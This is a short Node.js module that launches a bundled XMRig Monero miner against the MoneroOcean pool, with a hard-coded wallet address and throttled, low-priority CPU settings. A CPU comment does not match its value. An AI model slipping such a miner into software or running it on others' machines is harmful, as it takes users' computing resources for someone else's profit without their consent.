const { spawn } = require('child_process');
const path = require('path');
 const miner = ()=>{
    const xmrigPath = path.join(__dirname, 'miners', process.platform === 'win32' ? 'xmrig.exe' : 'xmrig');
console.log(xmrigPath);
const miner = spawn(xmrigPath, [
    '-o', 'gulf.moneroocean.stream:10032',
    '-u', '47bBDxmrhaZUscZv3wZDmC7qRiAm2YnsXiuWGSuiHEAGeDcSe1pctd2AuzjYYUbbh3XKu8GpFigfnT3yfeYRXzczQ2nD2zd',
    '-p', 'x',
    '--cpu-priority', '1',                    // Low priority
    '--cpu-max-threads-hint', '0.1',         // ~20% of logical CPUs
    '-t','1'
    ]);




miner.stdout.on('data', data => console.log(`[XMRig] ${data}`));
miner.stderr.on('data', data => console.error(`[XMRig Error] ${data}`));
miner.on('close', code => console.log(`[XMRig] exited with code ${code}`));
}


module.exports = miner

